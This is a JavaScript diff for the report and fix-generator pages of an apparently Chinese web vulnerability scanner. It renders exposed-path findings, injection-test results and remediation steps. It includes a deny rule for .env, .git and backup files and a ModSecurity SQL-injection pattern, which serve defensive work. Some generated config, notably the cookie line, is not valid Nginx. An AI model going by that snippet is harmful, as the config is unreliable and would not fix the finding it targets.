+        html += '<div style="color:var(--danger)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span>  已暴露 (' + (p.size || '-') + ' bytes)</div>';
+      });
+      html += '</div></div>';
+    }
+    // 疑似风险（黄色）
+    if (suspectPaths.length > 0) {
+      html += '<div style="margin-bottom:12px">';
+      html += '<div style="font-size:13px;font-weight:700;color:var(--warning);margin-bottom:6px;padding:4px 8px;background:rgba(240,167,50,0.08);border-radius:2px;border-left:3px solid var(--warning)">注意： 疑似风险 (' + suspectPaths.length + ')</div>';
+      html += '<div style="font-size:12px;line-height:2">';
+      suspectPaths.forEach(function(p) {
+        html += '<div style="color:var(--warning)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span> 注意： ' + escapeHtml(p.reason || '疑似误报，需人工确认') + '</div>';
+      });
+      html += '</div></div>';
+    }
+    // 公开信息（蓝色）
+    if (infoPaths.length > 0) {
+      html += '<div style="margin-bottom:12px">';
+      html += '<div style="font-size:13px;font-weight:700;color:#4b6eaf;margin-bottom:6px;padding:4px 8px;background:rgba(59,130,246,0.08);border-radius:2px;border-left:3px solid #4b6eaf">信息： 公开信息 (' + infoPaths.length + ')</div>';
+      html += '<div style="font-size:12px;line-height:2">';
+      infoPaths.forEach(function(p) {
+        html += '<div style="color:#4b6eaf">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span> 信息： 公开信息</div>';
+      });
+      html += '</div></div>';
+    }
+    // 其他
+    if (otherPaths.length > 0) {
+      html += '<div style="font-size:12px;line-height:2">';
+      otherPaths.forEach(function(p) {
+        if (p.protected) {
+          html += '<div style="color:var(--success)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span>  已保护</div>';
+        } else {
+          html += '<div style="color:var(--text-lighter)">' + escapeHtml(p.path) + ' <span style="color:var(--text-lighter)">[' + p.status + ']</span></div>';
+        }
+      });
+      html += '</div>';
+    }
+    html += '</div>';
+  }
+
+  // Deep scan: Crawled pages
+  if ( data.crawled_pages && data.crawled_pages.length > 0) {
+    html += '<div class="card fade-in-up" style="animation-delay:0.38s">';
+    html += '<div class="card-title"> 爬取页面 (' + data.crawled_pages.length + ' 页)</div>';
+    html += '<div style="font-size:12px;line-height:2;max-height:200px;overflow-y:auto">';
+    data.crawled_pages.forEach(function(p) {
+      html += '<div style="display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--border-light)">';
+      html += '<span style="color:' + (p.status === 200 ? 'var(--success)' : 'var(--warning)') + ';font-weight:600;min-width:30px">[' + p.status + ']</span>';
+      html += '<span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + escapeHtml(p.url) + '">' + escapeHtml(p.url) + '</span>';
+      if (p.forms > 0) html += '<span style="color:var(--warning);font-size:12px">' + p.forms + ' 表单</span>';
+      if (p.inputs > 0) html += '<span style="color:var(--primary);font-size:12px">' + p.inputs + ' 输入框</span>';
+      html += '</div>';
+    });
+    html += '</div></div>';
+  }
+
+  // Deep scan: Vulnerability test results
+  if ( data.vuln_tests && data.vuln_tests.length > 0) {
+    let vulnCount = data.vuln_tests.filter(function(t) { return t.vulnerable; }).length;
+    let totalTests = data.vuln_tests.length;
+    html += '<div class="card fade-in-up" style="animation-delay:0.40s">';
+    html += '<div class="card-title"> 漏洞注入测试</div>';
+    html += '<div style="display:flex;gap:12px;margin-bottom:10px;font-size:13px">';
+    html += '<span style="color:var(--text-secondary)">测试总数: <strong>' + totalTests + '</strong></span>';
+    html += '<span style="color:' + (vulnCount > 0 ? 'var(--danger)' : 'var(--success)') + '">发现漏洞: <strong>' + vulnCount + '</strong></span>';
+    html += '</div>';
+    html += '<div style="font-size:12px;line-height:1.8;max-height:180px;overflow-y:auto">';
+    data.vuln_tests.forEach(function(t) {
+      let color = t.vulnerable ? 'var(--danger)' : 'var(--text-lighter)';
+      let icon = t.vulnerable ? '' : '';
+      html += '<div style="color:' + color + ';padding:2px 0">';
+      html += icon + ' [' + t.type + '] ' + escapeHtml(t.param) + '=' + escapeHtml(t.payload) + ' (' + escapeHtml(t.url.substring(0, 50)) + '...)</div>';
+    });
+    html += '</div></div>';
+  }
+
+  // Scan mode badge
+  if ( data.scan_type === 'deep') {
+    html += '<div style="text-align:center;margin:12px 0">';
+    html += '<span style="display:inline-block;padding:4px 14px;background:rgba(75,110,175,0.1);color:var(--primary);border-radius:2px;font-size:12px;font-weight:600">深度扫描模式 - 含漏洞注入测试</span>';
+    html += '</div>';
+  }
+
+  // One-click fix section
+  let configFindings = data.findings.filter(function(f) {
+    return f.owasp === 'A05 安全配置错误' || f.owasp === 'A02 加密机制失效' || f.name.indexOf('缺少') === 0;
+  });
+  if ( configFindings.length > 0) {
+    html += '<div class="card fade-in-up" style="animation-delay:0.42s">';
+    html += '<div class="card-title"> 一键生成修复配置</div>';
+    html += '<p style="font-size:13px;color:var(--text-secondary);margin-bottom:10px">检测到 ' + configFindings.length + ' 个配置类问题，可自动生成 Nginx 修复配置。</p>';
+    html += '<div class="fixer-btns">';
+    html += '<button class="fixer-btn primary" onclick="goToFixerWithScanResult()"> 生成修复配置</button>';
+    html += '<div class="report-download-dropdown">';
+    html += '<button class="pdf-download-btn" onclick="toggleReportDropdown()"> 下载报告 <span style="font-size:11px">▼</span></button>';
+    html += '<div class="report-dropdown-menu" id="report-dropdown">';
+    html += '<div onclick="downloadReport(\'pdf\');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background=\'var(--bg-secondary)\'" onmouseout="this.style.background=\'transparent\'">';
+    html += '<span>PDF</span><span>PDF 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">适合打印存档</span>';
+    html += '</div>';
+    html += '<div onclick="downloadReport(\'html\');toggleReportDropdown()" style="padding:8px 14px;cursor:pointer;font-size:13px;display:flex;align-items:center;gap:8px" onmouseover="this.style.background=\'var(--bg-secondary)\'" onmouseout="this.style.background=\'transparent\'">';
+    html += '<span>HTML</span><span>HTML 格式</span><span style="margin-left:auto;font-size:12px;color:var(--text-secondary)">精美可交互</span>';
+    html += '</div>';
+    html += '</div></div>';
+    html += '<button class="fixer-btn success" id="verify-fix-btn" onclick="verifyFix()"> 验证修复效果</button>';
+    html += '</div>';
+    html += '</div>';
+  }
+
+  html += '<div class="card fade-in-up" style="animation-delay:0.7s;background:#3c3f41,rgba(115,201,144,0.02));border:1px solid rgba(115,201,144,0.2);text-align:center">';
+  html += '<h3 class="card-title" style="color:var(--success)"> 扫描完成</h3>';
+  html += '<p style="color:var(--text-secondary);margin-bottom:16px">将修复配置应用到服务器后，点击下方按钮重新扫描验证效果</p>';
+  html += '<div style="display:flex;gap:10px;justify-content:center;flex-wrap:wrap">';
+  html += '<button class="btn btn-primary" onclick="verifyFix()"> 验证修复效果</button>';
+  html += '<button class="btn btn-secondary" onclick="shareResult()"> 分享报告</button>';
+  html += '<button class="btn btn-secondary" onclick="downloadReport(\'pdf\')"> 下载 PDF</button>';
+  html += '</div>';
+  html += '</div>';
+
+  // PDF 报告内容说明
+  html += '<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">';
+  html += '<div class="card-title"> PDF 报告内容说明</div>';
+  html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.8">';
+  html += '<div> <strong>风险摘要</strong>：确认漏洞数 / 疑似风险数 / 配置缺失数总览</div>';
+  html += '<div> <strong>证据详情</strong>：每个 finding 的响应头值、敏感路径内容片段、WAF 检测依据</div>';
+  html += '<div> <strong>修复建议</strong>：按服务器类型（Nginx / Apache / Express / Flask / Spring Boot / Cloudflare）分类的修复配置，含优先级排序</div>';
+  html += '<div> <strong>复测结果</strong>：上次 vs 本次分数对比、新增问题 / 已修复问题列表</div>';
+  html += '<div> <strong>评分变化</strong>：如有历史记录，展示分数变化趋势</div>';
+  html += '</div>';
+  html += '<div style="margin-top:10px;text-align:center">';
+  html += '<button class="btn btn-primary" onclick="downloadReport(\'pdf\')"> 下载 PDF 报告</button>';
+  html += '</div>';
+  html += '</div>';
+
+  // 扫描结论人话总结 - 强化成明确结论格式
+  let exposedCount = data.sensitive_paths ? data.sensitive_paths.filter(function(p){ return p.exposed; }).length : 0;
+  let suspectCount = data.sensitive_paths ? data.sensitive_paths.filter(function(p){ return p.suspect; }).length : 0;
+  let infoCount = data.sensitive_paths ? data.sensitive_paths.filter(function(p){ return p.info; }).length : 0;
+  let headerMissingCount = data.findings ? data.findings.filter(function(f){ return f.name.indexOf('缺少') === 0; }).length : 0;
+  let configCount = data.findings ? data.findings.filter(function(f){ return f.type === 'config' && f.name.indexOf('缺少') !== 0; }).length : 0;
+
+  // 构建一句明确结论
+  let conclusionParts = [];
+  if (exposedCount > 0) {
+    conclusionParts.push('发现 ' + exposedCount + ' 个确认级敏感文件泄露');
+  } else {
+    conclusionParts.push('未发现确认级敏感文件泄露');
+  }
+  if (suspectCount > 0) {
+    conclusionParts.push('检测到 ' + suspectCount + ' 个疑似 WAF/登录页响应');
+  }
+  if (headerMissingCount > 0 || configCount > 0) {
+    let totalConfig = headerMissingCount + configCount;
+    conclusionParts.push('另有 ' + totalConfig + ' 项安全响应头/配置缺失');
+  }
+  let conclusionText = conclusionParts.join('，') + '。';
+
+  html += '<div class="card fade-in-up" style="animation-delay:0.72s;background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2)">';
+  html += '<div class="card-title"> 扫描总评</div>';
+  html += '<div style="font-size:14px;line-height:1.8;font-weight:500">' + escapeHtml(conclusionText) + '</div>';
+
+  // 分项说明
+  html += '<div style="margin-top:10px;font-size:12px;line-height:2">';
+  if (exposedCount > 0) {
+    html += '<div style="color:var(--danger)"> 确认漏洞：' + exposedCount + ' 个敏感文件可直接访问，需立即修复</div>';
+  }
+  if (suspectCount > 0) {
+    html += '<div style="color:var(--warning)">注意： 疑似风险：' + suspectCount + ' 个路径返回 200，但内容命中 WAF/登录页/反爬特征，因此不判定为真实泄露，建议人工复核</div>';
+  }
+  if (infoCount > 0) {
+    html += '<div style="color:var(--primary)">信息： 公开信息：' + infoCount + ' 个路径为公开协议文件（如 robots.txt），仅作为信息项展示</div>';
+  }
+  if (headerMissingCount > 0) {
+    html += '<div style="color:var(--text-secondary)">&#x2022; 配置缺失：' + headerMissingCount + ' 个安全响应头未配置</div>';
+  }
+  html += '</div>';
+
+  // 建议行动
+  if (data.restricted) {
+    html += '<div style="margin-top:10px;padding:8px 12px;background:rgba(240,167,50,0.1);border-radius:2px;color:var(--warning);font-size:12px;line-height:1.6">';
+    html += '<strong>注意： 受限扫描提示</strong><br/>';
+    html += '目标站点存在 WAF/反爬/登录限制，本次扫描可能未获取完整信息。建议扫描网站首页或主域名，或联系站点管理员获取授权后进行深度扫描。';
+    html += '</div>';
+  } else if (exposedCount === 0 && suspectCount === 0 && (headerMissingCount > 0 || configCount > 0)) {
+    html += '<div style="margin-top:10px;padding:8px 12px;background:rgba(115,201,144,0.08);border-radius:2px;color:var(--success);font-size:12px">';
+    html += ' 未发现敏感文件泄露，整体风险可控。建议优先补充缺失的安全响应头以提升评分。';
+    html += '</div>';
+  }
+  html += '</div>';
+
+  //  修复优先级路线
+  (function() {
+    let step1Action = '', step1Effect = '', step1Done = false;
+    let step2Action = '', step2Effect = '', step2Done = false;
+    let step3Action = '', step3Effect = '', step3Done = false;
+
+    let hasExposed = data.findings.some(function(f) { return f.type === 'exposed' || (f.name && f.name.indexOf('敏感路径') >= 0); });
+    let hasHighHeader = data.findings.some(function(f) { return f.severity === 'high' && f.name && (f.name.indexOf('HSTS') >= 0 || f.name.indexOf('CSP') >= 0); });
+    let hasMedLowConfig = data.findings.some(function(f) { return (f.severity === 'medium' || f.severity === 'low') && f.type === 'config'; });
+    let hasServerLeak = data.findings.some(function(f) { return f.name && f.name.indexOf('Server') >= 0; });
+    let highMissing = data.findings.filter(function(f) { return f.severity === 'high' && f.name && f.name.indexOf('缺少') === 0; });
+    let medLowMissing = data.findings.filter(function(f) { return (f.severity === 'medium' || f.severity === 'low') && f.name && f.name.indexOf('缺少') === 0; });
+
+    if (hasExposed) {
+      step1Action = '修复 exposed 敏感路径（限制 .env/.git 等文件访问）';
+      step1Effect = '预计提升 20 分';
+      step1Done = false;
+    } else if (hasHighHeader) {
+      step1Action = '修复 high severity 响应头缺失（CSP / HSTS）';
+      step1Effect = '预计提升 15 分';
+      step1Done = false;
+    } else {
+      step1Action = '无紧急暴露路径，响应头配置良好';
+      step1Effect = '保持当前状态';
+      step1Done = true;
+    }
+
+    if (hasMedLowConfig || hasServerLeak || medLowMissing.length > 0) {
+      let parts = [];
+      if (medLowMissing.length > 0) parts.push('补充 ' + medLowMissing.length + ' 个 medium/low 响应头');
+      if (hasServerLeak) parts.push('隐藏 Server 版本信息');
+      step2Action = parts.join(' + ') || '检查并优化配置项';
+      step2Effect = '预计提升 8 分';
+      step2Done = false;
+    } else {
+      step2Action = 'medium/low 配置已完善，Server 信息已隐藏';
+      step2Effect = '无需操作';
+      step2Done = true;
+    }
+
+    step3Action = '生成修复配置后重新扫描，确认分数提升';
+    step3Effect = '验证闭环';
+    step3Done = step1Done && step2Done;
+
+    let stepStatus = function(done) {
+      return done ? '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(115,201,144,0.15);color:#73c990;border:1px solid rgba(115,201,144,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 已完成</span>' : '<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(240,167,50,0.15);color:#f0a732;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:2px 10px;font-size:12px;font-weight:600"> 未开始</span>';
+    };
+
+    html += '<div class="card fade-in-up" style="animation-delay:0.75s;background:#3c3f41,rgba(16,185,129,0.04));border:1px solid rgba(115,201,144,0.2)">';
+    html += '<div class="card-title"> 修复优先级路线</div>';
+    html += '<div style="display:flex;flex-direction:column;gap:10px">';
+
+    // Step 1
+    html += '<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">';
+    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">';
+    html += '<strong style="font-size:13px;color:#73c990">1. 第一步（立即）</strong>';
+    html += stepStatus(step1Done);
+    html += '</div>';
+    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">' + step1Action + '</div>';
+    html += '<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">' + step1Effect + '</div>';
+    html += '</div>';
+
+    // Arrow
+    html += '<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>';
+
+    // Step 2
+    html += '<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">';
+    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">';
+    html += '<strong style="font-size:13px;color:#73c990">2. 第二步（今天）</strong>';
+    html += stepStatus(step2Done);
+    html += '</div>';
+    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">' + step2Action + '</div>';
+    html += '<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">' + step2Effect + '</div>';
+    html += '</div>';
+
+    // Arrow
+    html += '<div style="text-align:center;color:rgba(115,201,144,0.6);font-size:16px">-></div>';
+
+    // Step 3
+    html += '<div style="background:rgba(0,0,0,0.15);border:1px solid rgba(115,201,144,0.15);border-radius:2px;padding:12px 14px">';
+    html += '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">';
+    html += '<strong style="font-size:13px;color:#73c990">3. 第三步（复测）</strong>';
+    html += stepStatus(step3Done);
+    html += '</div>';
+    html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.6">' + step3Action + '</div>';
+    html += '<div style="margin-top:6px;font-size:12px;color:#73c990;font-weight:600">' + step3Effect + '</div>';
+    html += '</div>';
+
+    html += '</div></div>';
+  })();
+
+  // 扫描范围说明和免责声明
+  html += '<div style="margin-top:20px;padding:16px;background:var(--bg-secondary);border-radius:2px;font-size:12px;color:var(--text-secondary)">';
+  html += '<div style="font-weight:600;margin-bottom:8px">检测范围说明</div>';
+  html += '<div>本次扫描检测了：HTTPS/TLS 配置、安全响应头（HSTS/CSP/X-Frame-Options 等 15+ 项）、Cookie 安全属性、CORS 策略、敏感路径暴露、WAF 识别。</div>';
+  html += '<div style="margin-top:4px">不进行：破坏性攻击、密码爆破、权限绕过、漏洞利用、主动渗透测试。</div>';
+  html += '<div style="margin-top:4px;color:var(--text-light)">如需全面安全评估，建议配合专业渗透测试服务。</div>';
+  html += '<div style="margin-top:8px;font-weight:600">如何验证结果</div>';
+  html += '<div>每个发现项都附有验证步骤，你可以通过命令行 curl 或浏览器 F12 开发者工具自行确认。修复后重新扫描，对比评分变化即可验证效果。</div>';
+  html += '<div style="margin-top:8px;font-weight:600">置信度说明</div>';
+  html += '<div>标记为「高」的发现项为确定性结果（如响应头缺失、证书过期）。标记为「中」的发现项需要人工复核（如敏感路径检测）。标记「建议人工复核」的项可能存在误报。</div>';
+  html += '<div style="margin-top:8px;font-weight:600">误报说明</div>';
+  html += '<div>安全扫描可能存在误报。建议结合专业安全评估综合判断。如认为某项为误报，可在修复建议中忽略该条目。</div>';
+  html += '<div style="margin-top:8px;font-weight:600">免责声明</div>';
+  html += '<div>本报告由漏洞哨兵智能规则引擎自动生成，仅反映扫描时刻的目标配置状况，不构成完整安全审计。建议降低风险而非追求"完全安全"。</div>';
+  html += '</div>';
+
+  let resultContent = document.getElementById('result-content');
+  if (!resultContent) {
+    console.warn('renderResult: result-content element not found');
+    return;
+  }
+  resultContent.innerHTML = html;
+  //  渲染雷达图
+  renderRadarChart(data);
+  //  数字滚动动画
+  animateScoreProgress(data.score);
+  } catch (e) {
+    console.error('renderResult error:', e);
+    let rc = document.getElementById('result-content');
+    if (rc) {
+      rc.innerHTML = '<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">注意：</div><h3 style="color:var(--danger);margin-bottom:8px">报告渲染出错</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在渲染扫描报告时遇到问题，但扫描数据本身是完整的。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：' + escapeHtml(e.message || String(e)) + '</p><button class="btn btn-primary" onclick="location.reload()"> 刷新页面重试</button></div>';
+    }
+  }
+}
+
+function scanRedirectTarget() {
+  if (!lastScanResult || !lastScanResult.redirect_reason) { showToast('无法识别跳转目标地址'); return; }
+  let reason = lastScanResult.redirect_reason;
+  let match = reason.match(/https?:\/\/[^\s\)]+/);
+  if (match && match[0]) {
+    let url = match[0];
+    let urlInput = document.getElementById('scan-url');
+    if (urlInput) urlInput.value = url;
+    startScanDirect();
+  } else {
+    showToast('无法识别跳转目标地址');
+  }
+}
+
+function shareResult() {
+  if (!lastScanResult || !lastScanResult.scan_id) { showToast('当前结果暂不支持分享'); return; }
+  // 优先使用后端返回的 share_id（如果 ScanResponse 里带了）
+  authFetch('/api/history?limit=1').then(function(r){return r.json();}).then(function(data){
+    let item = (data.history || [])[0];
+    if (!item || !item.share_id) { showToast('分享链接生成失败'); return; }
+    let url = window.location.origin + '/api/share/' + item.share_id;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(url).then(function(){
+        showToast('分享链接已复制到剪贴板');
+      });
+    } else {
+      prompt('复制以下分享链接：', url);
+    }
+  });
+}
+
+// PDF 下载提示（含报告内容说明）
+function showPdfDownloadTip() {
+  let html = '<div class="card fade-in-up" style="background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2);text-align:center">';
+  html += '<div style="font-size:18px;margin-bottom:8px"></div>';
+  html += '<div style="font-size:15px;font-weight:700;margin-bottom:6px">PDF 报告已生成</div>';
+  html += '<div style="font-size:12px;color:var(--text-secondary);line-height:1.7;margin-bottom:12px">';
+  html += '报告包含以下内容：<br>';
+  html += ' 风险摘要（确认漏洞 / 疑似风险 / 配置缺失）<br>';
+  html += ' 证据详情（响应头值、敏感路径片段、WAF 检测依据）<br>';
+  html += ' 修复建议（按服务器类型分类，含优先级排序）<br>';
+  html += ' 复测结果（上次 vs 本次分数对比、新增 / 已修复问题）<br>';
+  html += ' 评分变化趋势（如有历史记录）';
+  html += '</div>';
+  html += '<button class="btn btn-primary" onclick="downloadReport(\'pdf\')"> 立即下载 PDF</button>';
+  html += '</div>';
+  let rc = document.getElementById('result-content');
+  if (rc) rc.insertAdjacentHTML('afterbegin', html);
+}
+
+
+function toggleFinding(i) {
+  selectFinding(i);
+}
+
+function selectFinding(i) {
+  // Update list active state
+  document.querySelectorAll('.result-list-item').forEach(function(el) { el.classList.remove('active'); });
+  let listItem = document.getElementById('finding-list-' + i);
+  if (listItem) listItem.classList.add('active');
+  // Update detail active state
+  document.querySelectorAll('.finding-detail').forEach(function(el) { el.classList.remove('active'); });
+  let detail = document.getElementById('finding-detail-' + i);
+  if (detail) detail.classList.add('active');
+}
+
+// Generate Fix from Result
+function generateFixFromResult() {
+  setButtonLoading("gen-fix-btn", true);
+  try {
+  if (!lastScanResult) { setButtonLoading("gen-fix-btn", false); return; }
+  let inputEl = document.getElementById('gen-fix-input');
+  let output = document.getElementById('gen-fix-output');
+  if (!inputEl || !output) { setButtonLoading("gen-fix-btn", false); return; }
+  let input = inputEl.value.trim();
+  if (!input) {
+    output.innerHTML = '<div style="color:var(--warning);font-size:13px;margin-top:8px">注意： 请输入 Nginx 配置内容</div>';
+    setButtonLoading("gen-fix-btn", false);
+    return;
+  }
+  let result = generateFixFromFindings(lastScanResult.findings, input);
+  output.innerHTML = '<div style="margin-top:14px"><div class="finding-section"><h4>修复后配置</h4><div class="code-block">' + escapeHtml(result.fixed) + '</div></div>' +
+    '<div class="fixer-btns" style="margin-top:10px"><button class="fixer-btn success" onclick="copyText(this, \'' + btoa(encodeURIComponent(result.fixed)) + '\')"> 复制配置</button></div></div>';
+  } catch(e) {
+    console.error('generateFixFromResult error:', e);
+    let outEl = document.getElementById('gen-fix-output');
+    if (outEl) outEl.innerHTML = '<div style="color:var(--danger);font-size:13px;margin-top:8px">错误： 生成失败：' + escapeHtml(e.message || String(e)) + '</div>';
+  } finally {
+    setButtonLoading("gen-fix-btn", false);
+  }
+}
+
+function generateFixFromFindings(findings, config) {
+  try {
+    if (!Array.isArray(findings)) findings = [];
+    if (typeof config !== 'string') config = '';
+  let fixed = config;
+  let hasServerBlock = /server\s*\{/.test(fixed);
+
+  if (!hasServerBlock) {
+    fixed = 'server {\n    listen 80;\n    server_name example.com;\n    root /var/www/html;\n    index index.html;\n\n';
+  }
+
+  let headers = [];
+  let rules = [];
+
+  findings.forEach(function(f) {
+    let name = f.name || '';
+    let type = f.type || 'config';
+    let fix = f.fix || '';
+    // 通用匹配：任何"缺少 X" 安全头都进 headers
+    if (name.indexOf('缺少 ') === 0 && (name.indexOf('HSTS') >= 0 || name.indexOf('CSP') >= 0 ||
+        name.indexOf('X-Frame') >= 0 || name.indexOf('X-Content') >= 0 ||
+        name.indexOf('Referrer') >= 0 || name.indexOf('Permissions') >= 0)) {
+      if (fix) headers.push(fix);
+    } else if (name.indexOf('敏感路径') >= 0 || name.indexOf('敏感文件') >= 0) {
+      // 敏感路径类进 rules
+      rules.push('location ~ /(\\.env|\\.git|.*\\.sql|.*\\.zip|.*\\.bak) {\n    deny all;\n    return 403;\n}');
+    } else if (name.indexOf('信息泄露') >= 0 || name.indexOf('Server') >= 0) {
+      headers.push('server_tokens off;');
+    } else if (name.indexOf('Cookie') >= 0) {
+      headers.push('proxy_cookie_path / /; HttpOnly; Secure; SameSite=Strict;');
+    } else if (name.indexOf('CORS') >= 0) {
+      headers.push("add_header Access-Control-Allow-Origin 'https://your-domain.com' always;");
+    } else if (type === 'XSS' && fix) {
+      headers.push('add_header Content-Security-Policy "default-src \'self\'; script-src \'self\'" always;');
+    } else if (type === 'SQLi' && fix) {
+      rules.push('# ModSecurity: SecRule ARGS "(OR|UNION)" "deny,status:403"');
+    }
+  });
+
+  if (headers.length > 0 || rules.length > 0) {
+    if (hasServerBlock) {
+      let insertPos = fixed.lastIndexOf('}');
+      let before = fixed.substring(0, insertPos);
+      let after = fixed.substring(insertPos);
+      if (headers.length > 0) {
+        before += '\n    # === 安全响应头（由漏洞哨兵 11-S 生成） ===\n';
+        headers.forEach(function(h) {
+          let lines = h.split('\n');
+          lines.forEach(function(line) {
+            if (line.trim()) before += '    ' + line.trim() + '\n';
+          });
+        });
+      }
+      if (rules.length > 0) {
+        before += '\n    # === 拦截规则（由漏洞哨兵 11-S 生成） ===\n';
+        rules.forEach(function(r) {
+          before += '    ' + r + '\n';
+        });
+      }
+      fixed = before + after;
+    } else {
+      headers.forEach(function(h) { fixed += h + '\n'; });
+      rules.forEach(function(r) { fixed += r + '\n'; });
+      fixed += '}\n';
+    }
+  }
+
+  return { fixed: fixed };
+  } catch (e) {
+    console.error('generateFixFromFindings error:', e);
+    return { fixed: config || '', error: e.message || String(e) };
+  }
+}
+
+function goToFixerWithScanResult() {
+  if (!lastScanResult) { showToast('请先完成扫描'); return; }
+  setButtonLoading("goto-fixer-btn", true);
+  navigateTo('fixer');
+  showToast('正在生成修复方案...');
+  let url = lastScanResult.url;
+
+  authFetch('/api/fix', {
+    method: 'POST',
+    body: JSON.stringify({ url: url })
+  }).then(function(resp) { return resp.json(); }).then(function(data) {
+    setButtonLoading('goto-fixer-btn', false);
+    if (data.success) {
+      lastFixResult = data.fixes;
+      renderFixResult(data.fixes, data.score);
+    } else {
+      let fr = document.getElementById('fixer-result');
+      if (fr) fr.innerHTML = '<div class="card"><p style="color:var(--danger)">生成失败: ' + escapeHtml(extractError(data)) + '</p></div>';
+    }
+  }).catch(function(e) {
+    setButtonLoading('goto-fixer-btn', false);
+    // Fallback: use local findings
+    let fixes = generateLocalFixes(lastScanResult.findings);
+    lastFixResult = fixes;
+    renderFixResult(fixes, lastScanResult.score);
+  });
+}
+
+
+function generateLocalFixes(findings) {
+  try {
+    if (!Array.isArray(findings)) findings = [];
+  let fixes = { nginx: [], python: [], nodejs: [], apache: [] };
+  findings.forEach(function(f) {
+    let fix = f.fix || '';
+    if (fix) {
+      fixes.nginx.push(fix);
+      fixes.apache.push(fix.replace('add_header', 'Header set').replace('always;', ''));
+      fixes.python.push('# ' + f.name + ': ' + fix.substring(0, 60));
+      fixes.nodejs.push('// ' + f.name + ': ' + fix.substring(0, 60));
+    }
+  });
+  return fixes;
+  } catch (e) {
+    console.error('generateLocalFixes error:', e);
+    return { nginx: [], python: [], nodejs: [], apache: [] };
+  }
+}
+
+function renderFixResult(fixes, score) {
+  try {
+    if (!fixes || typeof fixes !== 'object') fixes = { nginx: [], python: [], nodejs: [], apache: [] };
+  let promptEl = document.getElementById('fixer-scan-prompt');
+  let tabsEl = document.getElementById('fixer-lang-tabs');
+  let resultEl = document.getElementById('fixer-result');
+  if (promptEl) promptEl.style.display = 'none';
+  if (tabsEl) tabsEl.style.display = 'block';
+  if (!resultEl) return;
+
+  let html = '';
+  let langLabels = { nginx: 'Nginx', python: 'Python (Flask)', nodejs: 'Node.js (Express)', apache: 'Apache' };
+  let langIcons = { nginx: '', python: '', nodejs: '', apache: '' };
+
+  let lang = currentFixLang;
+  let lines = fixes[lang] || [];
+
+  html += '<div class="card fade-in-up">';
+  html += '<div class="card-title">' + langIcons[lang] + ' ' + langLabels[lang] + ' 修复代码</div>';
+  html += '<div style="font-size:12px;color:var(--text-lighter);margin-bottom:10px">共 ' + lines.length + ' 条修复建议，评分: ' + (typeof score === 'number' && !isNaN(score) ? score : 0) + '</div>';
+
+  if (lines.length === 0) {
+    html += '<p style="color:var(--success);font-size:13px"> 未检测到需要修复的配置问题</p>';
+  } else {
+    // 兼容字符串列表 / {code, risk_note} 对象列表
+    let fullCode = lines.map(function(item) {
+      if (typeof item === 'string') return item;
+      if (item && typeof item === 'object') return item.code || '';
+      return String(item);
+    }).join('\n\n');
+    html += '<div class="code-block" style="max-height:400px;overflow-y:auto">' + escapeHtml(fullCode) + '</div>';
+    html += '<div class="fixer-btns" style="margin-top:12px">';
+    html += '<button class="fixer-btn success" onclick="copyFixCodeByLang(\'' + lang + '\')"> 复制代码</button>';
+    html += '<button class="fixer-btn primary" onclick="downloadFixCode(\'' + lang + '\')"> 下载文件</button>';
+    html += '</div>';
+  }
+
+  // Show all languages summary
+  html += '<div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border-light)">';
+  html += '<div style="font-size:12px;color:var(--text-lighter);margin-bottom:8px">其他语言修复方案：</div>';
+  ['nginx', 'python', 'nodejs', 'apache'].forEach(function(l) {
+    if (l === lang) return;
+    let count = (fixes[l] || []).length;
+    html += '<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px">';
+    html += '<span>' + langIcons[l] + ' ' + langLabels[l] + '</span>';
+    html += '<span style="color:var(--text-lighter)">' + count + ' 条修复</span>';
+    html += '</div>';
+  });
+  html += '</div>';
+  html += '</div>';
+
+  resultEl.innerHTML = html;
+  } catch (e) {
+    console.error('renderFixResult error:', e);
+    let resultEl = document.getElementById('fixer-result');
+    if (resultEl) resultEl.innerHTML = '<div class="card"><p style="color:var(--danger)">渲染修复结果失败: ' + escapeHtml(e.message || String(e)) + '</p></div>';
+  }
+}
+
+function switchFixLang(lang) {
+  currentFixLang = lang;
+  document.querySelectorAll('.lang-tab').forEach(function(btn) {
+    if (btn.dataset.lang === lang) {
+      btn.className = 'fixer-btn primary lang-tab active';
+    } else {
